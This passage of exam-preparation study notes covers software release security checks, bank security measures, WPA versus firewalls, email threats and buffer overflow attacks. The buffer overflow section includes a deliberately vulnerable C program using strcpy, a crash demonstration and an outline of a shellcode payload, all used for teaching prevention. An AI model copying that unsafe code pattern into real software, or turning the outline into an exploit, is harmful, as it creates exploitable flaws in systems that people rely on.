| **Redundancy** | **Diverse physical cable routes**, redundant power (UPS + N+1 generators), redundant cooling, a **DR site in another region** |
| **Operations** | Formal **change management**, **patch management**, configuration baselines, regular **vulnerability scanning and penetration testing** |
| **People** | **Background checks**, security training, **separation of duties**, a clear insider-threat programme |
| **Governance** | Compliance with the **Cyber Security Act 2023** CII obligations, annual audit, incident reporting to **BGD e-GOV CIRT**, tested **incident response and BCP** |

#### Security checks before releasing software

> *"As a programmer, what security should you check before releasing your software?"*

1. **Static Application Security Testing (SAST)** — scan the source code for injection flaws, hard-coded secrets and unsafe functions.
2. **Dynamic testing (DAST)** and a **penetration test** of the running application.
3. **Dependency / supply-chain scan (SCA)** — check every third-party library for known **CVEs**; a modern application is mostly other people's code.
4. **No hard-coded credentials, API keys or connection strings** — move them to a secrets manager or environment variables. **Scan the git history too**, not just the current files.
5. **Input validation and output encoding** everywhere — SQL injection, XSS, command injection, path traversal.
6. **Authentication and session management** review — password hashing with bcrypt/Argon2, secure cookie flags, session regeneration, MFA support.
7. **Authorization checks on the SERVER for every request** — never rely on hiding a button in the UI (broken access control is the #1 OWASP risk).
8. **Encryption** — TLS enforced, sensitive data encrypted at rest, strong algorithms, no custom crypto.
9. **Error handling and logging** — generic messages to users, detailed logs server-side, and **no sensitive data in the logs**.
10. **Remove all debug code, test accounts, default passwords and sample data**; disable directory listing and verbose banners.
11. **Security headers** configured (CSP, HSTS, X-Frame-Options).
12. **File upload restrictions** and safe storage.
13. **Rate limiting and anti-automation** on login and APIs.
14. **Threat model review** and a **security code review** by a second person.
15. **Code signing** the release so users can verify its authenticity.
16. A documented **patch and vulnerability disclosure process** for after release.

**Previous Year Question List from this Topic:**

- [Cryptography and Network Security Scenario: (BSCCPL AME 21-08-2026 (BUET)) Cox's Bazar wants to send confidential information to Kuakata through an insecure net…](../written-answers/computer-network-security.md?plain=1#L5508)
- [Explain Cyber Attack Scenario-](../written-answers/computer-network-security.md?plain=1#L5585)
- [Imagine yu should design a secure transmission protocol for sending data from one node to another node. You should divide the message in the multiple packets an…](../written-answers/computer-network-security.md?plain=1#L5631)
- [As a programmer when you release a software What security should you check before release your software.](../written-answers/computer-network-security.md?plain=1#L4292)
- [Your bank wants to secure an e-banking online system and wants to configure a web server in your data center. What kind of tools and technology do you use for t…](../written-answers/computer-network-security.md?plain=1#L3283)

## Cryptography & Network Security

### Banking Security — Key Measures in a Modern Bank

*(A recurring Focus-Writing and long-answer topic: "Banking Security", "Technology and the Banking Sector of Bangladesh".)*

Banks are the **most attacked organisations in the world**, because — as the bank robber Willie Sutton is said to have replied when asked why he robbed banks — *"that's where the money is."* A modern bank's security is built in **layers**, covering people, process and technology.

#### The threat landscape for a bank

| Threat | Description |
|---|---|
| **Phishing and social engineering** targeting customers and staff | The commonest entry point |
| **Banking trojans and malware** (Zeus, Emotet) | Steal credentials from the customer's own device |
| **Ransomware** | Can halt the entire bank |
| **ATM attacks** | **Skimming**, cash-out/jackpotting, card trapping |
| **SWIFT / payment-system fraud** | The **Bangladesh Bank heist of February 2016**, in which attackers used fraudulent SWIFT instructions to steal **US$81 million** |
| **Insider fraud** | Staff misusing legitimate access |
| **DDoS** | Often a smokescreen for a simultaneous fraud |
| **Card fraud** | Cloning, CNP (card-not-present) fraud, BIN attacks |
| **MFS fraud** | bKash/Nagad OTP scams, agent fraud, SIM swap |
| **Web and mobile app vulnerabilities** | SQL injection, insecure APIs |
| **Third-party / supply-chain compromise** | Through a vendor's access |

#### The key security measures

**1. Customer authentication**
- **Multi-factor authentication** on internet and mobile banking — password + **OTP**, or biometric.
- **Transaction PIN or a second OTP** for fund transfers and beneficiary addition.
- **Device binding** and **risk-based/adaptive authentication** (a new device or a new country triggers extra checks).
- **e-KYC with NID verification** and liveness detection at onboarding.
- Automatic **SMS/email alert on every transaction** — the customer is the fastest fraud detector.

**2. Encryption and data protection**
- **TLS 1.2/1.3** on every channel; **certificate pinning** in the mobile app.
- **End-to-end encryption of PIN blocks**; PINs are handled only inside **HSMs** and are never stored.
- **Encryption at rest** for the database (TDE) and backups.
- **Tokenisation** of card numbers so the real PAN is never stored in the application.
- **PCI-DSS compliance** for all cardholder data.

**3. Network and infrastructure security**
- **Segmentation** — core banking, card systems, ATM network, SWIFT and the corporate LAN are **separate zones**; SWIFT in particular must be an isolated, tightly controlled environment.
- **NGFW, IPS, WAF, anti-DDoS**, and a **DMZ** for all public-facing services.
- **Hardened, patched servers**; secure configuration baselines.
- **Redundancy and a DR site** with tested failover.

**4. Fraud detection and monitoring**
- **Real-time transaction monitoring** with rules and **machine-learning anomaly detection** — unusual amount, location, time, velocity or beneficiary.
- **AML/CFT screening** against sanction lists and suspicious-pattern rules.
- **24×7 SOC** with a **SIEM** correlating logs from every system.
- **Card velocity checks** and geo-blocking.

**5. Access control and insider-risk management**
- **Least privilege** and **role-based access**; annual access reviews.
- **Maker-checker (dual control)** on every financial entry — the person who creates a transaction can never be the one who approves it.
- **Privileged Access Management** with session recording for administrators.
- **Mandatory leave and job rotation** in sensitive roles.
- **Complete, immutable audit trails**.

**6. Physical and ATM security**
- CCTV, access control and alarms at branches, ATMs and the data centre.
- **Anti-skimming devices**, PIN shields, and tamper alarms on ATMs.
- **Hardened ATM operating systems**, application whitelisting, and full-disk encryption.

**7. Application security**
- **Secure SDLC** — threat modelling, secure coding standards, **SAST/DAST**, dependency scanning.
- **Penetration testing** of internet and mobile banking before every major release.
- **Secure API gateway** for open banking and partner integration.

**8. People and governance**
- **Continuous staff training** and simulated phishing.
- **Customer awareness campaigns** — "the bank will never ask for your OTP".
- A **CISO** and an independent information-security function.
- **Incident response and business continuity plans**, rehearsed.
- **Vendor risk management** and contractual security obligations.
- Compliance with the **Bangladesh Bank ICT Security Guideline**, ISO 27001 and PCI-DSS, with regular **internal and external audit**.

> **The lesson of the 2016 Bangladesh Bank heist**, worth citing in any such answer: the attackers succeeded not through one exotic exploit but through an accumulation of basic failures — a **flat network with the SWIFT terminal insufficiently isolated**, **weak monitoring** that let malware sit undetected for weeks, and **printer manipulation** that suppressed the confirmation messages that would have revealed the theft. **Security failures are almost always failures of fundamentals and of process — not of cryptography.**

**Previous Year Question List from this Topic:**

- [Focus Witting: Banking Security (English) (Discuss the key security measures used in modern banking applications to protect customer data and prevent fraud.)](../written-answers/computer-network-security.md?plain=1#L4207)
- [Role of computer on education system in Bangladesh.](../written-answers/computer-network-security.md?plain=1#L4278)
- [English: “50 years of bangladesh achievement and progress”](../written-answers/computer-network-security.md?plain=1#L4288)
- [“Smart Bangladesh” সংক্ষেপে আলোচনা করুন।](../written-answers/computer-network-security.md?plain=1#L4304)
- [Focus Writing in English “Technology and Banking Sector of Bangladesh”](../written-answers/computer-network-security.md?plain=1#L4325)
- [Let you procure a microfinance application and host it in your office's data centre. What kind of cyber-security threats should you be aware of and what steps w…](../written-answers/computer-network-security.md?plain=1#L250)


### Firewall Types — WPA vs a Network Firewall

> *"Write the difference between a WPA firewall and a network firewall."*

The question mixes two different things, and the correct answer begins by **clarifying that WPA is not a firewall at all**.

| Point | **WPA / WPA2 / WPA3** | **Network Firewall** |
|---|---|---|
| **What it actually is** | A **Wi-Fi ENCRYPTION and ACCESS-CONTROL protocol** — *Wi-Fi Protected Access*. **It is not a firewall** | A **traffic-filtering security device or software** |
| **Purpose** | **Encrypt the wireless link** and authenticate devices joining the Wi-Fi network | **Filter traffic** entering or leaving a network based on rules |
| **Layer** | **Data Link (Layer 2)** — the wireless link itself | **Network/Transport (3–4)**, or up to **Layer 7** for an NGFW |
| **Scope** | **Only the wireless segment**, between the device and the access point | **The whole network boundary**, wired and wireless |
| **Protects against** | Wireless eavesdropping, unauthorised devices joining the Wi-Fi, evil-twin attacks (WPA3) | Unauthorised access, port scanning, malicious traffic, data exfiltration |
| **Once traffic is past it** | WPA's protection **ENDS at the access point** — beyond that the traffic is unencrypted on the wired LAN | The firewall inspects the traffic wherever it is placed |
| **Encryption** | ✅ **Yes — that is its main job** (AES-CCMP in WPA2, SAE + GCMP in WPA3) | ❌ Not normally (a VPN gateway does that) |
| **Versions / types** | WEP (broken) → WPA (TKIP) → **WPA2 (AES)** → **WPA3 (current)** | Packet filter, stateful, proxy, **NGFW**, WAF |
| **Analogy** | A **sealed, locked tunnel** from your laptop to the Wi-Fi router | The **security checkpoint** at the building entrance |

> **The key point: they are complementary, not alternatives.** WPA3 stops an outsider sitting in the car park from reading your Wi-Fi traffic or joining the network. It does **nothing** to stop an attacker on the Internet from scanning your servers, or a compromised internal laptop from exfiltrating data — that is the firewall's job. A secure wireless network needs **WPA3 encryption, a firewall between the wireless VLAN and the internal network, and 802.1X authentication**.

**Securing a wireless network — the complete answer:**
1. Use **WPA3** (or **WPA2-AES** at minimum); **never WEP or WPA-TKIP**.
2. For an organisation, use **WPA2/3-Enterprise with 802.1X and RADIUS**, so each user authenticates individually rather than sharing one pre-shared key.
3. A **long, random passphrase** if PSK must be used, changed when staff leave.
4. **Change default** router/AP administrator credentials; keep firmware **patched**.
5. **Disable WPS** — it is brute-forceable.
6. **Segment** the wireless network onto its own **VLAN**, behind a firewall, with a separate **guest network** isolated from internal resources.
7. **Disable SSID broadcast obscurity as a security measure** — it is not one; rely on encryption instead.
8. Enable **MAC filtering** as a minor extra hurdle (easily spoofed — not a real control).
9. Reduce **transmit power** so the signal does not spill outside the building.
10. **Monitor for rogue access points and evil twins** with a wireless IDS.
11. Require a **VPN** for access to sensitive internal systems over Wi-Fi.

**Previous Year Question List from this Topic:**

- [Write the difference between WPA firewall and Network Firewall.](../written-answers/computer-network-security.md?plain=1#L4313)
- [Let you procure a microfinance application and host it in your office's data centre. What kind of cyber-security threats should you be aware of and what steps w…](../written-answers/computer-network-security.md?plain=1#L250)


---

## Email & Messaging Security (Spam, Phishing)

### Email Security — Spam, Phishing and Protection

#### What is email?

**Email (electronic mail)** is a method of exchanging **digital messages between people over a computer network**. It is the **oldest and still the most widely used** Internet application — and, precisely because it is universal and trusted, it is the **number one delivery channel for cyber attacks**.

**The protocols involved:**

| Protocol | Port | Function |
|---|---|---|
| **SMTP** — Simple Mail Transfer Protocol | 25 / **587** (submission) / 465 (SMTPS) | **SENDING** mail |
| **POP3** — Post Office Protocol v3 | 110 / **995** (secure) | **DOWNLOADING** mail — traditionally deletes it from the server |
| **IMAP** — Internet Message Access Protocol | 143 / **993** (secure) | **ACCESSING** mail, kept synchronised **on the server** across devices |
| **MIME** | — | **Multipurpose Internet Mail Extensions** — allows attachments, images and non-ASCII text in email |

#### Spam

> **Spam is UNSOLICITED BULK EMAIL** — unwanted messages sent indiscriminately to large numbers of recipients, usually for advertising, fraud or malware distribution. It is also called **junk mail**.
>
> *(The direct answer to "unsolicited email is called ___" is **SPAM**.)*

**Why spam is a security problem, not just a nuisance:** it consumes **bandwidth, storage and staff time**; it is the **primary vehicle for phishing, malware and ransomware**; it can constitute a **denial of service** by flooding a mailbox; and it trains users to click without thinking.

#### Email-borne threats

| Threat | Description |
|---|---|
| **Spam** | Unsolicited bulk mail |
| **Phishing / Spear phishing / Whaling** | Fraudulent messages harvesting credentials |
| **Malware attachments** | `.exe`, `.zip`, macro-enabled `.docm`/`.xlsm` files carrying ransomware or trojans |
| **Malicious links** | Leading to exploit kits or credential-harvesting pages |
| **Email spoofing** | Forging the `From:` address so the mail appears to come from the CEO or the bank |
| **Business Email Compromise (BEC)** | Impersonating an executive or supplier to redirect a payment — **the highest-value email fraud by far** |
| **Email bombing** | Flooding an address to cause a DoS or to bury a genuine alert |
| **Eavesdropping** | Plain SMTP is unencrypted; mail can be read in transit |
| **Account takeover** | Through a weak or reused password |

> **"If you download the email, what attack will you face?"** — downloading and opening an attachment or an embedded image from an untrusted email exposes you to a **malware / ransomware infection** (from the attachment), a **phishing** attack (from the links), and **tracking pixels** that confirm your address is live and actively read — which leads to more targeted attacks.

#### Protecting against unwanted and dangerous email

**Technical controls (for the organisation)**
1. **A secure email gateway** with **anti-spam and anti-malware** filtering and reputation checking.
2. **SPF (Sender Policy Framework)** — publishes in DNS which servers are authorised to send mail for your domain.
3. **DKIM (DomainKeys Identified Mail)** — **digitally signs** outgoing mail so the recipient can verify it was not altered and really came from your domain.
4. **DMARC** — ties SPF and DKIM together, tells receivers what to do with failures (reject/quarantine), and provides **reporting**. Together these three **stop attackers spoofing your domain** — the single most effective anti-phishing measure an organisation can deploy.
5. **Attachment sandboxing** — detonate attachments in an isolated environment before delivery.
6. **URL rewriting and time-of-click protection** — check links at the moment the user clicks, not just at delivery.
7. **Block dangerous attachment types** (`.exe`, `.scr`, `.js`, `.vbs`) and **disable Office macros** by policy.
8. **Encrypt mail in transit (TLS)** and, for sensitive content, **end-to-end with S/MIME or PGP**.
9. **Visual banners on external email** — a simple, remarkably effective warning.
10. **MFA on all mailboxes**, and alerts on mailbox rule changes (attackers create forwarding rules).
11. **DLP** to stop sensitive data leaving by email.

**User practices**
12. **Never open unexpected attachments**, even from a known sender — their account may be compromised.
13. **Hover over links** to see the real destination before clicking.
14. **Verify payment-change requests by phone**, on a known number — this alone defeats most BEC fraud.
15. **Do not reply to spam or click "unsubscribe"** in a clearly fraudulent message — it confirms your address is live.
16. **Never publish your address publicly** in plain form; use a **secondary address** for sign-ups.
17. Use the **"Report Spam / Report Phishing"** button, which also improves the filter.
18. **Use a strong unique password + MFA** on the mail account.
19. **Be sceptical of urgency** — every phishing email creates artificial time pressure.
20. **Keep the mail client and OS patched.**

#### POP3 vs IMAP

| Point | **POP3** | **IMAP** |
|---|---|---|
| **Mail stored on** | **The local device** (downloaded and usually deleted from the server) | **The server** — the client shows a synchronised view |
| **Multiple devices** | ❌ Poor — mail downloaded to the PC is not on the phone | ✅ **Excellent** — perfectly synchronised everywhere |
| **Server storage used** | Minimal | High |
| **Works offline** | ✅ Fully | Partly (with local caching) |
| **Folder synchronisation** | ❌ No | ✅ Yes |
| **Port** | 110 / **995 (SSL)** | 143 / **993 (SSL)** |
| **Best for** | A single device, limited server quota | **Modern multi-device use — the default today** |

**Previous Year Question List from this Topic:**

- [Unsoliciated email is called?](../written-answers/computer-network-security.md?plain=1#L5693)
- [If you downloaded the email, you will be able to face the problem. Which attack do you face?](../written-answers/computer-network-security.md?plain=1#L5715)
- [e) What is email? What precautions can be taken to prevent unnecessary and unwanted e-mails?](../written-answers/computer-network-security.md?plain=1#L5742)


---

## Buffer Overflow & Software Vulnerabilities

### Buffer Overflow Attack

A **buffer overflow** occurs when a program **writes more data into a buffer (a fixed-size block of memory) than the buffer can hold**, so the excess data **overflows into adjacent memory locations**, corrupting or overwriting whatever was there.

> **The root cause:** languages such as **C and C++ perform NO automatic bounds checking**. If you declare `char buffer[10]` and write 50 bytes into it, the language happily writes all 50 — the extra 40 simply land in whatever memory follows.

#### The stack layout — why this is dangerous

```mermaid
flowchart TD
    subgraph STACK["Stack frame of a function (grows downward)"]
        A["Local buffer<br/>char buffer[10]"]
        B["Other local variables"]
        C["Saved frame pointer (EBP)"]
        D["🎯 RETURN ADDRESS<br/>— where to jump when the function ends"]
        E["Function arguments"]
    end
    A -->|"overflow writes<br/>DOWNWARD past the buffer"| B
    B --> C
    C --> D
```

When a function is called, the CPU pushes the **return address** onto the stack so it knows where to resume afterwards. A local buffer sits **below** that return address. **If the attacker writes past the end of the buffer, they eventually overwrite the RETURN ADDRESS** — and can point it wherever they like.

#### A worked example

**The vulnerable code:**

```c
#include <stdio.h>
#include <string.h>

void vulnerable(char *input) {
    char buffer[10];              /* only 10 bytes reserved */
    strcpy(buffer, input);        /* ❌ strcpy does NO length check */
    printf("You entered: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    vulnerable(argv[1]);
    return 0;
}
```

**Normal input:**
```
$ ./prog "Hello"
You entered: Hello                     ← 5 bytes into a 10-byte buffer. Fine.
```

**Overflow input:**
```
$ ./prog "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
Segmentation fault (core dumped)       ← the return address has been
                                          overwritten with 0x41414141 ('AAAA'),
                                          and the CPU jumped to an invalid address
```

**The memory picture:**

| Address (conceptual) | Before | After a 36-byte input |
|---|---|---|
| `buffer[0..9]` | `Hello\0` + unused | `AAAAAAAAAA` |
| Other locals | valid data | `AAAAAAAA` **← corrupted** |
| Saved EBP | valid pointer | `AAAA` **← corrupted** |
| **Return address** | `0x08048456` (back to `main`) | **`0x41414141`** ← **the attacker controls where the CPU jumps** |

#### From a crash to code execution

A crash is merely a **denial of service**. A real attack goes further:

1. The attacker constructs a payload: **[NOP sled][shellcode][padding][a return address pointing back into the NOP sled]**.
2. The overflow places the **shellcode** (machine code that, for example, opens a shell) into the buffer.
3. The overwritten **return address** points back into the buffer.
4. When the function returns, the CPU **jumps into the attacker's shellcode and executes it** — with the privileges of the running program.
5. If the program runs as **root/Administrator**, the attacker now has **full control of the machine**.

#### Types of buffer overflow

| Type | Location | Note |
|---|---|---|
| **Stack overflow** | The call stack | The classic; overwrites the return address |
| **Heap overflow** | Dynamically allocated memory | Overwrites heap metadata or function pointers |
| **Integer overflow → buffer overflow** | An arithmetic wrap-around produces a tiny allocation size | A common root cause |
| **Format string** | `printf(userInput)` instead of `printf("%s", userInput)` | Allows arbitrary memory read and write |
| **Off-by-one** | Writing one byte past the end | Enough to corrupt the saved frame pointer |

#### Historic impact

**The Morris Worm (1988)** — the first internet worm — spread using a buffer overflow in the `fingerd` daemon. **Code Red**, **SQL Slammer**, **Blaster** and the **EternalBlue/WannaCry** chain all exploited memory-corruption flaws. Buffer overflows dominated the vulnerability landscape for two decades and remain a leading cause of critical CVEs in C/C++ software today.

#### Prevention — the complete answer

**At the code level**
1. **Use safe library functions** — `strncpy`, `snprintf`, `strncat`, `fgets` — **never** `strcpy`, `sprintf`, `strcat`, `gets`. **`gets()` has been removed from the C standard** because it cannot be used safely.
2. **Always validate and bound-check input length** before copying.
3. Use the **buffer size**, never a hard-coded number: `strncpy(buf, src, sizeof(buf) - 1); buf[sizeof(buf)-1] = '\0';`
4. Prefer **safer data types** — C++ `std::string` and `std::vector` manage their own memory.
5. Use a **memory-safe language** where possible — **Java, C#, Python, Go, Rust**. Rust in particular gives C-level performance with compile-time memory safety, which is why it is being adopted for new system software.

**At the compiler level**
6. **Stack canaries (`-fstack-protector`)** — a random value is placed just before the return address and checked before returning; if it has changed, the program aborts.
7. **FORTIFY_SOURCE** — the compiler replaces unsafe calls with length-checked versions where the size is known.
8. Compile with **`-Wall -Wextra -Werror`** and fix every warning.

**At the operating-system level**
9. **ASLR (Address Space Layout Randomisation)** — randomises memory addresses on every run, so the attacker cannot predict where to jump.
10. **DEP / NX bit (Data Execution Prevention)** — marks the stack and heap as **non-executable**, so injected shellcode cannot run.
11. **Control Flow Integrity (CFI)** and shadow stacks in modern compilers and CPUs.

**At the process level**
12. **Static analysis (SAST)** and **fuzzing** — fuzzing in particular is extremely effective at finding overflows.
13. **Dynamic analysis** with **AddressSanitizer** and **Valgrind** during testing.
14. **Code review** of all memory-handling code.
15. **Run services with least privilege**, so a successful exploit gains little.
16. **Patch promptly** — most real-world exploitation targets known, already-patched flaws.

> **The defence-in-depth point worth making:** no single mitigation is sufficient. Stack canaries, ASLR and DEP each raise the difficulty substantially, and together they make exploitation very hard — but attackers respond with techniques such as **Return-Oriented Programming (ROP)**, which reuses existing executable code instead of injecting new code. **The only complete fix is to write memory-safe code in the first place.**

**Previous Year Question List from this Topic:**

- [Explain buffer overflow attack with an example.](../written-answers/computer-network-security.md?plain=1#L5776)
